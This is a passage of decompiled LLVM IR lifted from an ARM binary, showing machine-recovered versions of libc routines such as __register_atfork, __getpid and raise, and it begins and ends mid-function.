  %v1_10948 = load i32, i32* %r4.global-to-local, align 4
  %v3_10948 = icmp uge i32 %v2_10944, %v1_10948
  store i1 %v3_10948, i1* %cpsr_c.global-to-local, align 1
  %v9_10948 = icmp eq i32 %v2_10944, %v1_10948
  br i1 %v9_10948, label %dec_label_pc_10950, label %dec_label_pc_10968

dec_label_pc_10950:                               ; preds = %dec_label_pc_10944
  store i32 %v2_10944, i32* %r0.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_10960 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_10960, label %dec_label_pc_10964, label %dec_label_pc_10950.dec_label_pc_10944_crit_edge

dec_label_pc_10950.dec_label_pc_10944_crit_edge:  ; preds = %dec_label_pc_10950
  %v0_10944.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_10944

dec_label_pc_10964:                               ; preds = %dec_label_pc_10950
  %v0_10964 = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_10968

dec_label_pc_10968:                               ; preds = %dec_label_pc_10944, %dec_label_pc_10964
  %v0_10968 = phi i32 [ %v0_10964, %dec_label_pc_10964 ], [ %v2_10944, %dec_label_pc_10944 ]
  %v1_10968 = phi i32 [ %v0_10964, %dec_label_pc_10964 ], [ %v1_10948, %dec_label_pc_10944 ]
  %v3_10968 = icmp uge i32 %v0_10968, %v1_10968
  store i1 %v3_10968, i1* %cpsr_c.global-to-local, align 1
  %v9_10968 = icmp eq i32 %v0_10968, %v1_10968
  br i1 %v9_10968, label %dec_label_pc_10970, label %dec_label_pc_10968.dec_label_pc_10934_crit_edge

dec_label_pc_10968.dec_label_pc_10934_crit_edge:  ; preds = %dec_label_pc_10968
  %v0_10934.pre = load i32, i32* %r5.global-to-local, align 4
  %v1_10934.pre = load i32, i32* %r7.global-to-local, align 4
  %v0_10938.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_10934

dec_label_pc_10970:                               ; preds = %dec_label_pc_10968
  %v2_10970 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_10970, i32* %r4.global-to-local, align 4
  %v1_10974 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_10974

; uselistorder directives
  uselistorder i32 %v0_10964, { 1, 0 }
  uselistorder i32 %v1_10948, { 0, 2, 1 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 0, 1 }
  uselistorder i32 add (i32 ptrtoint (i32* @global_var_24010.405 to i32), i32 15396), { 1, 0 }
  uselistorder i32 15396, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_10968, { 1, 0 }
}

define i32 @__GI___register_atfork(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v3_10980 = load i32, i32* @r4, align 4
  %v12_10980 = load i32, i32* @r7, align 4
  %v15_10980 = load i32, i32* @r8, align 4
  store i32 ptrtoint (i32* @global_var_24010.405 to i32), i32* @r6, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_24010.405 to i32), i32 11588), i32* @r5, align 4
  store i32 %arg2, i32* @sb, align 4
  store i32 %arg3, i32* @fp, align 4
  %v0_109a0 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_109a0, i32* @r8, align 4
  store i32 %arg4, i32* @sl, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_24010.405 to i32), i32 11588), i32* %r2.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %v2_109b472 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24010.405 to i32), i32 11588) to i32*), align 4
  store i32 %v2_109b472, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_109b874 = icmp eq i32 %v2_109b472, 0
  br i1 %v9_109b874, label %dec_label_pc_109c0, label %dec_label_pc_109d8

dec_label_pc_109c0:                               ; preds = %entry, %dec_label_pc_109c0.dec_label_pc_109b4_crit_edge
  %v0_109c075 = phi i32 [ %v1_109b8.pre, %dec_label_pc_109c0.dec_label_pc_109b4_crit_edge ], [ 0, %entry ]
  store i32 %v0_109c075, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_109d0 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_109d0, label %dec_label_pc_109d4, label %dec_label_pc_109c0.dec_label_pc_109b4_crit_edge

dec_label_pc_109c0.dec_label_pc_109b4_crit_edge:  ; preds = %dec_label_pc_109c0
  %v0_109b4.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_109b8.pre = load i32, i32* @r4, align 4
  %v1_109b4 = inttoptr i32 %v0_109b4.pre to i32*
  %v2_109b4 = load i32, i32* %v1_109b4, align 4
  store i32 %v2_109b4, i32* %r3.global-to-local, align 4
  %v3_109b8 = icmp uge i32 %v2_109b4, %v1_109b8.pre
  store i1 %v3_109b8, i1* %cpsr_c.global-to-local, align 1
  %v9_109b8 = icmp eq i32 %v2_109b4, %v1_109b8.pre
  br i1 %v9_109b8, label %dec_label_pc_109c0, label %dec_label_pc_109d8

dec_label_pc_109d4:                               ; preds = %dec_label_pc_109c0
  %v0_109d4 = load i32, i32* @r4, align 4
  store i32 %v0_109d4, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_109d8

dec_label_pc_109d8:                               ; preds = %entry, %dec_label_pc_109c0.dec_label_pc_109b4_crit_edge, %dec_label_pc_109d4
  %v0_109d8 = phi i32 [ %v0_109d4, %dec_label_pc_109d4 ], [ %v2_109b472, %entry ], [ %v2_109b4, %dec_label_pc_109c0.dec_label_pc_109b4_crit_edge ]
  %v1_109d8 = phi i32 [ %v0_109d4, %dec_label_pc_109d4 ], [ 0, %entry ], [ %v1_109b8.pre, %dec_label_pc_109c0.dec_label_pc_109b4_crit_edge ]
  %v3_109d8 = icmp uge i32 %v0_109d8, %v1_109d8
  store i1 %v3_109d8, i1* %cpsr_c.global-to-local, align 1
  %v9_109d8 = icmp eq i32 %v0_109d8, %v1_109d8
  br i1 %v9_109d8, label %bb48, label %bb

bb:                                               ; preds = %dec_label_pc_109d8
  %v1_109dc = load i32, i32* @r5, align 4
  store i32 %v1_109dc, i32* %r0.global-to-local, align 4
  br label %bb48

bb48:                                             ; preds = %dec_label_pc_109d8, %bb
  store i32 68068, i32* @lr, align 4
  %v1_109e0 = xor i1 %v9_109d8, true
  call void @__pseudo_cond_branch(i1 %v1_109e0, i32 ptrtoint (i32* @global_var_10884.421 to i32))
  store i32 11592, i32* %r3.global-to-local, align 4
  store i32 28, i32* %r1.global-to-local, align 4
  %v0_109ec = load i32, i32* @r6, align 4
  %v2_109ec = add i32 %v0_109ec, 11592
  %v0_109f0.pre = load i32, i32* @r4, align 4
  %tmp49 = icmp ult i32 %v0_109f0.pre, 48
  br label %dec_label_pc_109f0

dec_label_pc_109f0:                               ; preds = %dec_label_pc_10a14, %bb48
  %v0_10a14 = phi i32 [ %v2_10a14, %dec_label_pc_10a14 ], [ %v2_109ec, %bb48 ]
  store i32 %v0_109f0.pre, i32* %r2.global-to-local, align 4
  br i1 %tmp49, label %dec_label_pc_109f8, label %dec_label_pc_10a14

dec_label_pc_109f8:                               ; preds = %dec_label_pc_109f0, %dec_label_pc_10a08
  %v0_10a08 = phi i32 [ %v1_10a08, %dec_label_pc_10a08 ], [ %v0_109f0.pre, %dec_label_pc_109f0 ]
  %v3_109f8 = mul i32 %v0_10a08, 28
  %v4_109f8 = add i32 %v3_109f8, %v0_10a14
  store i32 %v4_109f8, i32* %r3.global-to-local, align 4
  %v1_109fc = add i32 %v4_109f8, 24
  %v2_109fc = inttoptr i32 %v1_109fc to i32*
  %v3_109fc = load i32, i32* %v2_109fc, align 4
  store i32 %v3_109fc, i32* %r3.global-to-local, align 4
  %v2_10a00 = icmp eq i32 %v3_109fc, 0
  br i1 %v2_10a00, label %dec_label_pc_10a50.loopexit, label %dec_label_pc_10a08

dec_label_pc_10a08:                               ; preds = %dec_label_pc_109f8
  %v1_10a08 = add nuw nsw i32 %v0_10a08, 1
  store i32 %v1_10a08, i32* %r2.global-to-local, align 4
  %tmp50 = icmp ult i32 %v1_10a08, 48
  br i1 %tmp50, label %dec_label_pc_109f8, label %dec_label_pc_10a14

dec_label_pc_10a14:                               ; preds = %dec_label_pc_10a08, %dec_label_pc_109f0
  %v1_10a14 = inttoptr i32 %v0_10a14 to i32*
  %v2_10a14 = load i32, i32* %v1_10a14, align 4
  store i32 %v2_10a14, i32* @r7, align 4
  %v2_10a18 = icmp eq i32 %v2_10a14, 0
  br i1 %v2_10a18, label %dec_label_pc_10a20, label %dec_label_pc_109f0

dec_label_pc_10a20:                               ; preds = %dec_label_pc_10a14
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i32 1, i32* %r0.global-to-local, align 4
  store i32 1348, i32* %r1.global-to-local, align 4
  %v2_10a28 = call i32 @calloc(i32 1, i32 1348)
  store i32 %v2_10a28, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_10a2c = icmp eq i32 %v2_10a28, 0
  br i1 %v2_10a2c, label %bb51, label %dec_label_pc_10a38

bb51:                                             ; preds = %dec_label_pc_10a20
  %v1_10a30 = load i32, i32* @r7, align 4
  store i32 %v1_10a30, i32* @r5, align 4
  br label %dec_label_pc_10a80

dec_label_pc_10a38:                               ; preds = %dec_label_pc_10a20
  store i32 11592, i32* %r2.global-to-local, align 4
  %v0_10a3c = load i32, i32* @r6, align 4
  %v2_10a3c = add i32 %v0_10a3c, 11592
  %v3_10a3c = inttoptr i32 %v2_10a3c to i32*
  %v4_10a3c = load i32, i32* %v3_10a3c, align 4
  store i32 %v4_10a3c, i32* %r3.global-to-local, align 4
  store i32 %v2_10a28, i32* @r7, align 4
  %v2_10a44 = inttoptr i32 %v2_10a28 to i32*
  store i32 %v4_10a3c, i32* %v2_10a44, align 4
  %v0_10a48 = load i32, i32* %r0.global-to-local, align 4
  %v1_10a48 = load i32, i32* @r6, align 4
  %v2_10a48 = load i32, i32* %r2.global-to-local, align 4
  %v3_10a48 = add i32 %v2_10a48, %v1_10a48
  %v4_10a48 = inttoptr i32 %v3_10a48 to i32*
  store i32 %v0_10a48, i32* %v4_10a48, align 4
  store i32 47, i32* %r2.global-to-local, align 4
  %v2_10a54.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_10a50

dec_label_pc_10a50.loopexit:                      ; preds = %dec_label_pc_109f8
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  br label %dec_label_pc_10a50

dec_label_pc_10a50:                               ; preds = %dec_label_pc_10a50.loopexit, %dec_label_pc_10a38
  %v2_10a54 = phi i32 [ %v0_10a14, %dec_label_pc_10a50.loopexit ], [ %v2_10a54.pre, %dec_label_pc_10a38 ]
  %v0_10a54 = phi i32 [ %v0_10a08, %dec_label_pc_10a50.loopexit ], [ 47, %dec_label_pc_10a38 ]
  %v3_10a54 = mul i32 %v0_10a54, 28
  %v4_10a54 = add i32 %v3_10a54, %v2_10a54
  store i32 %v4_10a54, i32* %r3.global-to-local, align 4
  %v2_10a5c = add i32 %v4_10a54, 24
  %v3_10a5c = inttoptr i32 %v2_10a5c to i32*
  store i32 1, i32* %v3_10a5c, align 4
  %v0_10a60 = load i32, i32* %r3.global-to-local, align 4
  %v1_10a60 = add i32 %v0_10a60, 4
  store i32 %v1_10a60, i32* @r5, align 4
  %v2_10a60 = icmp ugt i32 %v0_10a60, -5
  store i1 %v2_10a60, i1* %cpsr_c.global-to-local, align 1
  %v7_10a60 = icmp eq i32 %v1_10a60, 0
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_10a68 = add i32 %v0_10a60, 28
  %v3_10a68 = inttoptr i32 %v2_10a68 to i32*
  store i32 0, i32* %v3_10a68, align 4
  br i1 %v7_10a60, label %dec_label_pc_10a80, label %dec_label_pc_10a70

dec_label_pc_10a70:                               ; preds = %dec_label_pc_10a50
  %v0_10a70 = load i32, i32* @r5, align 4
  %v1_10a70 = add i32 %v0_10a70, 4
  %v2_10a70 = inttoptr i32 %v1_10a70 to i32*
  %v3_10a70 = load i32, i32* @r8, align 4
  store i32 %v3_10a70, i32* %v2_10a70, align 4
  %v4_10a70 = add i32 %v0_10a70, 8
  %v5_10a70 = inttoptr i32 %v4_10a70 to i32*
  %v6_10a70 = load i32, i32* @sb, align 4
  store i32 %v6_10a70, i32* %v5_10a70, align 4
  %v7_10a70 = add i32 %v0_10a70, 12
  %v8_10a70 = inttoptr i32 %v7_10a70 to i32*
  %v9_10a70 = load i32, i32* @fp, align 4
  store i32 %v9_10a70, i32* %v8_10a70, align 4
  %v0_10a74 = load i32, i32* @sl, align 4
  %v1_10a74 = load i32, i32* @r5, align 4
  %v2_10a74 = add i32 %v1_10a74, 16
  %v3_10a74 = inttoptr i32 %v2_10a74 to i32*
  store i32 %v0_10a74, i32* %v3_10a74, align 4
  %v0_10a78 = load i32, i32* @r5, align 4
  store i32 %v0_10a78, i32* %r0.global-to-local, align 4
  %v1_10a7c = inttoptr i32 %v0_10a78 to i32*
  %v2_10a7c = call i32 @__linkin_atfork(i32* %v1_10a7c)
  store i32 %v2_10a7c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10a80

dec_label_pc_10a80:                               ; preds = %bb51, %dec_label_pc_10a50, %dec_label_pc_10a70
  store i32 11588, i32* %r7.global-to-local, align 4
  %v0_10a84 = load i32, i32* @r6, align 4
  %v2_10a84 = add i32 %v0_10a84, 11588
  store i32 %v2_10a84, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_10a88

dec_label_pc_10a88:                               ; preds = %dec_label_pc_10ab8.dec_label_pc_10a88_crit_edge, %dec_label_pc_10a80
  %v0_10a90 = phi i32 [ %v0_10a90.pre, %dec_label_pc_10ab8.dec_label_pc_10a88_crit_edge ], [ %v2_10a84, %dec_label_pc_10a80 ]
  %v1_10a88 = phi i32 [ %v1_10a88.pre, %dec_label_pc_10ab8.dec_label_pc_10a88_crit_edge ], [ 11588, %dec_label_pc_10a80 ]
  %v0_10a88 = phi i32 [ %v0_10a88.pre, %dec_label_pc_10ab8.dec_label_pc_10a88_crit_edge ], [ %v0_10a84, %dec_label_pc_10a80 ]
  %v2_10a88 = add i32 %v0_10a88, %v1_10a88
  %v3_10a88 = inttoptr i32 %v2_10a88 to i32*
  %v4_10a88 = load i32, i32* %v3_10a88, align 4
  store i32 %v4_10a88, i32* %r4.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_10a90, i32* %r2.global-to-local, align 4
  %v1_10a9460 = inttoptr i32 %v0_10a90 to i32*
  %v2_10a9461 = load i32, i32* %v1_10a9460, align 4
  store i32 %v2_10a9461, i32* %r3.global-to-local, align 4
  %v3_10a9863 = icmp uge i32 %v2_10a9461, %v4_10a88
  store i1 %v3_10a9863, i1* %cpsr_c.global-to-local, align 1
  %v9_10a9869 = icmp eq i32 %v2_10a9461, %v4_10a88
  br i1 %v9_10a9869, label %dec_label_pc_10aa0, label %dec_label_pc_10ab8

dec_label_pc_10aa0:                               ; preds = %dec_label_pc_10a88, %dec_label_pc_10aa0.dec_label_pc_10a94_crit_edge
  %v0_10aa070 = phi i32 [ %v1_10a98.pre, %dec_label_pc_10aa0.dec_label_pc_10a94_crit_edge ], [ %v4_10a88, %dec_label_pc_10a88 ]
  store i32 %v0_10aa070, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_10ab0 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_10ab0, label %dec_label_pc_10ab4, label %dec_label_pc_10aa0.dec_label_pc_10a94_crit_edge

dec_label_pc_10aa0.dec_label_pc_10a94_crit_edge:  ; preds = %dec_label_pc_10aa0
  %v0_10a94.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_10a98.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_10a94 = inttoptr i32 %v0_10a94.pre to i32*
  %v2_10a94 = load i32, i32* %v1_10a94, align 4
  store i32 %v2_10a94, i32* %r3.global-to-local, align 4
  %v3_10a98 = icmp uge i32 %v2_10a94, %v1_10a98.pre
  store i1 %v3_10a98, i1* %cpsr_c.global-to-local, align 1
  %v9_10a98 = icmp eq i32 %v2_10a94, %v1_10a98.pre
  br i1 %v9_10a98, label %dec_label_pc_10aa0, label %dec_label_pc_10ab8

dec_label_pc_10ab4:                               ; preds = %dec_label_pc_10aa0
  %v0_10ab4 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_10ab4, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10ab8

dec_label_pc_10ab8:                               ; preds = %dec_label_pc_10a88, %dec_label_pc_10aa0.dec_label_pc_10a94_crit_edge, %dec_label_pc_10ab4
  %v0_10ac0 = phi i32 [ %v0_10ab4, %dec_label_pc_10ab4 ], [ %v2_10a9461, %dec_label_pc_10a88 ], [ %v2_10a94, %dec_label_pc_10aa0.dec_label_pc_10a94_crit_edge ]
  %v1_10ab8 = phi i32 [ %v0_10ab4, %dec_label_pc_10ab4 ], [ %v4_10a88, %dec_label_pc_10a88 ], [ %v1_10a98.pre, %dec_label_pc_10aa0.dec_label_pc_10a94_crit_edge ]
  %v3_10ab8 = icmp uge i32 %v0_10ac0, %v1_10ab8
  store i1 %v3_10ab8, i1* %cpsr_c.global-to-local, align 1
  %v9_10ab8 = icmp eq i32 %v0_10ac0, %v1_10ab8
  br i1 %v9_10ab8, label %dec_label_pc_10ac0, label %dec_label_pc_10ab8.dec_label_pc_10a88_crit_edge

dec_label_pc_10ab8.dec_label_pc_10a88_crit_edge:  ; preds = %dec_label_pc_10ab8
  %v0_10a88.pre = load i32, i32* @r6, align 4
  %v1_10a88.pre = load i32, i32* %r7.global-to-local, align 4
  %v0_10a90.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_10a88

dec_label_pc_10ac0:                               ; preds = %dec_label_pc_10ab8
  %v2_10ac0 = icmp ne i32 %v1_10ab8, 0
  store i1 %v2_10ac0, i1* %cpsr_c.global-to-local, align 1
  %v7_10ac4 = icmp slt i32 %v1_10ab8, 2
  br i1 %v7_10ac4, label %dec_label_pc_10ae0, label %dec_label_pc_10ac8

dec_label_pc_10ac8:                               ; preds = %dec_label_pc_10ac0
  %v0_10ac8 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v0_10ac8, i32* %r0.global-to-local, align 4
  %v0_10acc = load i32, i32* %r1.global-to-local, align 4
  %v1_10acc = add i32 %v0_10acc, 129
  store i32 %v1_10acc, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 240, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_10ae0

dec_label_pc_10ae0:                               ; preds = %dec_label_pc_10ac8, %dec_label_pc_10ac0
  %v0_10ae0 = load i32, i32* @r5, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_10ae0 = icmp eq i32 %v0_10ae0, 0
  %. = select i1 %v2_10ae0, i32 12, i32 0
  store i32 %., i32* %r0.global-to-local, align 4
  store i32 %v3_10980, i32* %r4.global-to-local, align 4
  store i32 %v12_10980, i32* %r7.global-to-local, align 4
  store i32 %v15_10980, i32* %r8.global-to-local, align 4
  ret i32 %.

; uselistorder directives
  uselistorder i32 %v0_10ab4, { 1, 0, 2 }
  uselistorder i32 %v1_10a98.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v2_10a28, { 1, 0, 2, 3 }
  uselistorder i32 %v2_10a14, { 1, 2, 0 }
  uselistorder i32 %v1_10a08, { 1, 2, 0 }
  uselistorder i32 %v0_10a08, { 0, 2, 1 }
  uselistorder i32 %v0_10a14, { 0, 2, 1 }
  uselistorder i32 %v0_109f0.pre, { 0, 2, 1 }
  uselistorder i32 %v0_109d4, { 1, 0, 2 }
  uselistorder i32 %v1_109b8.pre, { 0, 3, 2, 1 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 4, 3, 15, 5, 6, 7, 8, 9, 10, 11, 13, 12, 14, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 11, 9, 10, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32* %r0.global-to-local, { 11, 2, 3, 5, 4, 9, 10, 6, 7, 8, 0, 1 }
  uselistorder i1* %cpsr_c.global-to-local, { 2, 3, 4, 5, 12, 13, 6, 11, 7, 0, 8, 10, 9, 1 }
  uselistorder i32 11592, { 0, 2, 1, 3 }
  uselistorder i32 11588, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_10ab8, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10aa0, { 1, 0 }
  uselistorder label %dec_label_pc_10a80, { 2, 1, 0 }
  uselistorder label %dec_label_pc_109f8, { 1, 0 }
  uselistorder label %bb48, { 1, 0 }
  uselistorder label %dec_label_pc_109d8, { 2, 1, 0 }
  uselistorder label %dec_label_pc_109c0, { 1, 0 }
}

define i32 @function_10afc(i32 %arg1) local_unnamed_addr {
dec_label_pc_10afc:
  %v0_10afc = load i1, i1* @cpsr_z, align 1
  br i1 %v0_10afc, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_10afc
  %v2_10afc = load i32, i32* @r4, align 4
  %v5_10b04 = sdiv i32 %v2_10afc, 1024
  %v6_10b04 = and i32 %v5_10b04, %arg1
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_10afc, %bb
  %v7_10b04 = phi i32 [ %arg1, %dec_label_pc_10afc ], [ %v6_10b04, %bb ]
  ret i32 %v7_10b04

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @__getpid() local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_10b08 = load i32, i32* @r7, align 4
  store i32 %v3_10b08, i32* %stack_var_-8, align 4
  %v0_10b0c = call i32 @__aeabi_read_tp()
  store i32 %v0_10b0c, i32* %r0.global-to-local, align 4
  %v1_10b10 = add i32 %v0_10b0c, -1060
  %v2_10b10 = inttoptr i32 %v1_10b10 to i32*
  %v3_10b10 = load i32, i32* %v2_10b10, align 4
  %tmp7 = icmp slt i32 %v3_10b10, 1
  br i1 %tmp7, label %dec_label_pc_10b20, label %dec_label_pc_10b44

dec_label_pc_10b20:                               ; preds = %entry
  %v2_10b14 = icmp eq i32 %v3_10b10, 0
  br i1 %v2_10b14, label %dec_label_pc_10b24, label %dec_label_pc_10b30

dec_label_pc_10b24:                               ; preds = %dec_label_pc_10b20
  %v1_10b24 = add i32 %v0_10b0c, -1064
  %v2_10b24 = inttoptr i32 %v1_10b24 to i32*
  %v3_10b24 = load i32, i32* %v2_10b24, align 4
  store i32 %v3_10b24, i32* %r0.global-to-local, align 4
  %v2_10b28 = icmp eq i32 %v3_10b24, 0
  br i1 %v2_10b28, label %bb, label %bb8

dec_label_pc_10b30:                               ; preds = %dec_label_pc_10b20
  br label %bb8

bb:                                               ; preds = %dec_label_pc_10b24
  store i32 0, i32* %v2_10b24, align 4
  %v0_10b40.pre = load i32, i32* %r0.global-to-local, align 4
  br label %bb8

bb8:                                              ; preds = %dec_label_pc_10b30, %dec_label_pc_10b24, %bb
  %v0_10b40 = phi i32 [ %v3_10b24, %dec_label_pc_10b24 ], [ %v0_10b0c, %dec_label_pc_10b30 ], [ %v0_10b40.pre, %bb ]
  br label %dec_label_pc_10b44

dec_label_pc_10b44:                               ; preds = %entry, %bb8
  %v0_10b44 = phi i32 [ %v3_10b10, %entry ], [ %v0_10b40, %bb8 ]
  store i32 %v0_10b44, i32* %r0.global-to-local, align 4
  %v2_10b48 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_10b48, i32* @r7, align 4
  ret i32 %v0_10b44

; uselistorder directives
  uselistorder i32 %v0_10b44, { 1, 0 }
  uselistorder i32 %v3_10b10, { 1, 2, 0 }
  uselistorder label %dec_label_pc_10b44, { 1, 0 }
  uselistorder label %bb8, { 2, 0, 1 }
}

define i32 @__GI_raise(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_10b50 = load i32, i32* @r4, align 4
  store i32 %v3_10b50, i32* %stack_var_-20, align 4
  %v0_10b58 = call i32 @__aeabi_read_tp()
  store i32 %v0_10b58, i32* %r0.global-to-local, align 4
  %v1_10b5c = add i32 %v0_10b58, -1064
  %v2_10b5c = inttoptr i32 %v1_10b5c to i32*
  %v3_10b5c = load i32, i32* %v2_10b5c, align 4
  store i32 %v3_10b5c, i32* %r4.global-to-local, align 4
  %v2_10b60 = icmp eq i32 %v3_10b5c, 0
  %v1_10b68 = add i32 %v0_10b58, -1060
  %v2_10b68 = inttoptr i32 %v1_10b68 to i32*
  %v3_10b68 = load i32, i32* %v2_10b68, align 4
  store i32 %v3_10b68, i32* %r0.global-to-local, align 4
  br i1 %v2_10b60, label %dec_label_pc_10b70, label %dec_label_pc_10b84

dec_label_pc_10b70:                               ; preds = %entry
  store i32 %v3_10b68, i32* %r4.global-to-local, align 4
  store i32 %v3_10b68, i32* %v2_10b5c, align 4
  %v0_10bac.pre = load i32, i32* %r0.global-to-local, align 4
  br label %bb28

dec_label_pc_10b84:                               ; preds = %entry
  %v5_10b88 = icmp sgt i32 %v3_10b68, 0
  br i1 %v5_10b88, label %bb28, label %dec_label_pc_10b8c

dec_label_pc_10b8c:                               ; preds = %dec_label_pc_10b84
  %tmp = bitcast i32 %v3_10b68 to float
  %tmp30 = call float @fabsf(float %tmp)
  %v1_10b8c = bitcast float %tmp30 to i32
  %v2_10b90 = icmp eq i32 %v1_10b8c, 0
  br i1 %v2_10b90, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_10b8c
  store i32 %v3_10b5c, i32* %r0.global-to-local, align 4
  br label %bb28

.thread:                                          ; preds = %dec_label_pc_10b8c
  %v2_10b98 = sub i32 0, %v3_10b68
  store i32 %v2_10b98, i32* %r0.global-to-local, align 4
  br label %bb28

bb28:                                             ; preds = %bb, %dec_label_pc_10b84, %dec_label_pc_10b70, %.thread
  %v0_10bb0 = phi i32 [ %v3_10b68, %dec_label_pc_10b84 ], [ %v0_10bac.pre, %dec_label_pc_10b70 ], [ %v3_10b5c, %bb ], [ %v2_10b98, %.thread ]
  store i32 %v0_10bb0, i32* %r2.global-to-local, align 4
  %tmp31 = icmp ult i32 %v0_10bb0, -4095
  br i1 %tmp31, label %dec_label_pc_10bd4, label %dec_label_pc_10bbc

dec_label_pc_10bbc:                               ; preds = %bb28
  %v0_10bc0 = call i32 @__aeabi_read_tp()
  %v3_10bc4 = load i16, i16* @global_var_24070.401, align 2
  %v4_10bc4 = sext i16 %v3_10bc4 to i32
  %v0_10bc8 = load i32, i32* %r2.global-to-local, align 4
  %v1_10bc8 = sub i32 0, %v0_10bc8
  store i32 %v1_10bc8, i32* %r2.global-to-local, align 4
  %v3_10bcc = add i32 %v4_10bc4, %v0_10bc0
  %v4_10bcc = inttoptr i32 %v3_10bcc to i32*
  store i32 %v1_10bc8, i32* %v4_10bcc, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10bd4

dec_label_pc_10bd4:                               ; preds = %bb28, %dec_label_pc_10bbc
  %v0_10bd8 = phi i32 [ %v0_10bb0, %bb28 ], [ -1, %dec_label_pc_10bbc ]
  %v3_10bd4 = icmp eq i32 %v0_10bd8, -1
  store i32 %v0_10bd8, i32* %r5.global-to-local, align 4
  br i1 %v3_10bd4, label %dec_label_pc_10be0, label %dec_label_pc_10c28

dec_label_pc_10be0:                               ; preds = %dec_label_pc_10bd4
  %v0_10be4 = call i32 @__aeabi_read_tp()
  store i32 %v0_10be4, i32* %r0.global-to-local, align 4
  %v3_10be8 = load i16, i16* @global_var_24070.401, align 2
  %v4_10be8 = sext i16 %v3_10be8 to i32
  %v2_10bec = add i32 %v4_10be8, %v0_10be4
  %v3_10bec = inttoptr i32 %v2_10bec to i32*
  %v4_10bec = load i32, i32* %v3_10bec, align 4
  %v7_10bf0 = icmp eq i32 %v4_10bec, 38
  br i1 %v7_10bf0, label %dec_label_pc_10bfc, label %dec_label_pc_10be0.dec_label_pc_10c28_crit_edge

dec_label_pc_10be0.dec_label_pc_10c28_crit_edge:  ; preds = %dec_label_pc_10be0
  %v0_10c28.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_10c28

dec_label_pc_10bfc:                               ; preds = %dec_label_pc_10be0
  %v0_10bfc = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_10bfc, i32* %r0.global-to-local, align 4
  %tmp32 = icmp ugt i32 %v0_10bfc, -4096
  br i1 %tmp32, label %bb29, label %.thread22

bb29:                                             ; preds = %dec_label_pc_10bfc
  %v5_10c14 = sub i32 0, %v0_10bfc
